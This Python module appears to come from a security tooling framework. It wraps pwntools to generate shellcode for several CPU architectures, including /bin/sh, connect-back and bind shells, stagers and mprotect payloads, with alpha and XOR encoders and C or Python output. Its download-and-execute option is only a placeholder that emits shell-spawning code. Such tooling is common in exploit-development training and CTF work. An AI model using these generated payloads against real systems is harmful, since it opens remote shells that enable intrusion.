from __future__ import annotations
import binascii
from typing import Dict, Any, List, Optional
from ..core.task import Task

try:
    from pwn import *
    PWN_AVAILABLE = True
except ImportError:
    PWN_AVAILABLE = False


class ShellcodeGen(Task):
    """Shellcode generation using pwntools."""
    
    # Supported architectures
    SUPPORTED_ARCHS = {
        'i386': {'arch': 'i386', 'endian': 'little', 'bits': 32},
        'x86_64': {'arch': 'amd64', 'endian': 'little', 'bits': 64},
        'amd64': {'arch': 'amd64', 'endian': 'little', 'bits': 64},
        'arm': {'arch': 'arm', 'endian': 'little', 'bits': 32},
        'aarch64': {'arch': 'aarch64', 'endian': 'little', 'bits': 64},
        'mips': {'arch': 'mips', 'endian': 'big', 'bits': 32},
        'mips64': {'arch': 'mips64', 'endian': 'big', 'bits': 64},
    }
    
    # Common shellcode types
    SHELLCODE_TYPES = [
        'sh',           # Execute /bin/sh
        'execve',       # Execute arbitrary command
        'connect',      # Connect back shell
        'bind',         # Bind shell
        'download',     # Download and execute
        'findpeer',     # Find peer shellcode
        'stager',       # Stager shellcode
        'mprotect',     # Make memory executable
        'read',         # Read from file descriptor
        'write',        # Write to file descriptor
    ]
    
    async def validate_params(self) -> None:
        """Validate ShellcodeGen parameters."""
        if not PWN_AVAILABLE:
            raise ValueError("pwntools is not available. Install it with: pip install pwntools")
        
        arch = self.params.get("arch", "x86_64")
        if arch not in self.SUPPORTED_ARCHS:
            raise ValueError(f"Unsupported architecture: {arch}. Supported: {list(self.SUPPORTED_ARCHS.keys())}")
        
        shellcode_type = self.params.get("type", "sh")
        if shellcode_type not in self.SHELLCODE_TYPES:
            raise ValueError(f"Unsupported shellcode type: {shellcode_type}. Supported: {self.SHELLCODE_TYPES}")
    
    async def run(self) -> Dict[str, Any]:
        """Generate shellcode based on parameters."""        
        arch = self.params.get("arch", "x86_64")
        shellcode_type = self.params.get("type", "sh")
        
        self.logger.info(f"Generating {shellcode_type} shellcode for {arch}")
        
        try:
            # Set pwntools context
            arch_config = self.SUPPORTED_ARCHS[arch]
            context.clear()
            context.arch = arch_config['arch']
            context.endian = arch_config['endian']
            context.bits = arch_config['bits']
            
            # Generate shellcode based on type
            if shellcode_type == "sh":
                shellcode = self._generate_sh_shellcode()
            elif shellcode_type == "execve":
                shellcode = self._generate_execve_shellcode()
            elif shellcode_type == "connect":
                shellcode = self._generate_connect_shellcode()
            elif shellcode_type == "bind":
                shellcode = self._generate_bind_shellcode()
            elif shellcode_type == "download":
                shellcode = self._generate_download_shellcode()
            elif shellcode_type == "findpeer":
                shellcode = self._generate_findpeer_shellcode()
            elif shellcode_type == "stager":
                shellcode = self._generate_stager_shellcode()
            elif shellcode_type == "mprotect":
                shellcode = self._generate_mprotect_shellcode()
            elif shellcode_type == "read":
                shellcode = self._generate_read_shellcode()
            elif shellcode_type == "write":
                shellcode = self._generate_write_shellcode()
            else:
                raise ValueError(f"Unsupported shellcode type: {shellcode_type}")
            
            # Apply encoders if requested
            encoded_shellcode = self._apply_encoders(shellcode)
            
            # Generate analysis
            analysis = self._analyze_shellcode(encoded_shellcode)
            
            result = {
                "architecture": arch,
                "type": shellcode_type,
                "shellcode": {
                    "raw": binascii.hexlify(shellcode).decode(),
                    "encoded": binascii.hexlify(encoded_shellcode).decode() if encoded_shellcode != shellcode else None,
                    "length": len(encoded_shellcode),
                    "c_format": self._to_c_format(encoded_shellcode),
                    "python_format": self._to_python_format(encoded_shellcode),
                    "assembly": self._disassemble(encoded_shellcode) if self.params.get("include_asm", False) else None
                },
                "analysis": analysis,
                "parameters": self._get_generation_params()
            }
            
            self.logger.info(f"Generated {len(encoded_shellcode)} byte {shellcode_type} shellcode for {arch}")
            return result
            
        except Exception as e:
            self.logger.error(f"Shellcode generation failed: {str(e)}")
            raise RuntimeError(f"Shellcode generation failed: {str(e)}")
    
    def _generate_sh_shellcode(self) -> bytes:
        """Generate /bin/sh execution shellcode."""
        return asm(shellcraft.sh())
    
    def _generate_execve_shellcode(self) -> bytes:
        """Generate execve shellcode."""
        command = self.params.get("command", "/bin/sh")
        args = self.params.get("args", [])
        return asm(shellcraft.execve(command, args))
    
    def _generate_connect_shellcode(self) -> bytes:
        """Generate connect-back shellcode."""
        host = self.params.get("host", "127.0.0.1")
        port = self.params.get("port", 4444)
        return asm(shellcraft.connect(host, port))
    
    def _generate_bind_shellcode(self) -> bytes:
        """Generate bind shell shellcode."""
        port = self.params.get("port", 4444)
        return asm(shellcraft.bind(port))
    
    def _generate_download_shellcode(self) -> bytes:
        """Generate download and execute shellcode."""
        url = self.params.get("url", "http://example.com/payload")
        filename = self.params.get("filename", "/tmp/payload")
        # This is a simplified version - real implementation would be more complex
        return asm(shellcraft.sh())  # Placeholder
    
    def _generate_findpeer_shellcode(self) -> bytes:
        """Generate findpeer shellcode."""
        return asm(shellcraft.findpeer())
    
    def _generate_stager_shellcode(self) -> bytes:
        """Generate stager shellcode."""
        stage_size = self.params.get("stage_size", 1024)
        return asm(shellcraft.stager(stage_size))
    
    def _generate_mprotect_shellcode(self) -> bytes:
        """Generate mprotect shellcode."""
        return asm(shellcraft.mprotect('rsp', 'rsp', 'PROT_READ | PROT_WRITE | PROT_EXEC'))
    
    def _generate_read_shellcode(self) -> bytes:
        """Generate read shellcode."""
        fd = self.params.get("fd", 0)  # stdin by default
        buffer_size = self.params.get("buffer_size", 1024)
        return asm(shellcraft.read(fd, 'rsp', buffer_size))
    
    def _generate_write_shellcode(self) -> bytes:
        """Generate write shellcode."""
        fd = self.params.get("fd", 1)  # stdout by default
        data = self.params.get("data", "Hello World!")
        return asm(shellcraft.write(fd, data))
    
    def _apply_encoders(self, shellcode: bytes) -> bytes:
        """Apply encoders to shellcode if requested."""
        encoders = self.params.get("encoders", [])
        encoded = shellcode
        
        for encoder in encoders:
            if encoder == "alpha":
                # Alpha-numeric encoder
                try:
                    encoded = encode(encoded, 'alpha')
                except:
                    self.logger.warning("Alpha encoding failed, using original shellcode")
            elif encoder == "xor":
                # XOR encoder
                key = self.params.get("xor_key", 0xAA)
                try:
                    encoded = xor(encoded, key)
                except:
                    self.logger.warning("XOR encoding failed, using original shellcode")
        
        return encoded
    
    def _analyze_shellcode(self, shellcode: bytes) -> Dict[str, Any]:
        """Analyze shellcode for bad characters and patterns."""
        analysis = {
            "length": len(shellcode),
            "bad_chars": [],
            "null_bytes": shellcode.count(b'\x00'),
            "printable_ratio": 0.0,
            "entropy": 0.0
        }
        
        # Check for bad characters
        bad_chars = self.params.get("bad_chars", [0x00, 0x0a, 0x0d])
        for bad_char in bad_chars:
            if bad_char in shellcode:
                analysis["bad_chars"].append(hex(bad_char))
        
        # Calculate printable character ratio
        printable_count = sum(1 for b in shellcode if 32 <= b <= 126)
        analysis["printable_ratio"] = printable_count / len(shellcode) if shellcode else 0.0
        
        # Basic entropy calculation
        if shellcode:
            byte_counts = [shellcode.count(bytes([i])) for i in range(256)]
            total = len(shellcode)
            entropy = -sum((count/total) * math.log2(count/total) for count in byte_counts if count > 0)
            analysis["entropy"] = round(entropy, 2)
        
        return analysis
    
    def _to_c_format(self, shellcode: bytes) -> str:
        """Convert shellcode to C format."""
        hex_bytes = [f"\\x{b:02x}" for b in shellcode]
        lines = []
        for i in range(0, len(hex_bytes), 16):
            line = ''.join(hex_bytes[i:i+16])
            lines.append(f'  "{line}"')
        
        return 'unsigned char shellcode[] = \n' + '\n'.join(lines) + ';'
    
    def _to_python_format(self, shellcode: bytes) -> str:
        """Convert shellcode to Python format."""
        return f'shellcode = {repr(shellcode)}'
    
    def _disassemble(self, shellcode: bytes) -> str:
        """Disassemble shellcode."""
        try:
            return disasm(shellcode)
        except:
            return "Disassembly failed"
    
    def _get_generation_params(self) -> Dict[str, Any]:
        """Get parameters used for generation."""
        return {
            "architecture": self.params.get("arch", "x86_64"),
            "type": self.params.get("type", "sh"),
            "encoders": self.params.get("encoders", []),
            "bad_chars": self.params.get("bad_chars", []),
            "custom_params": {k: v for k, v in self.params.items() 
                           if k not in ["arch", "type", "encoders", "bad_chars"]}
        }

# Add math import for entropy calculation
import math
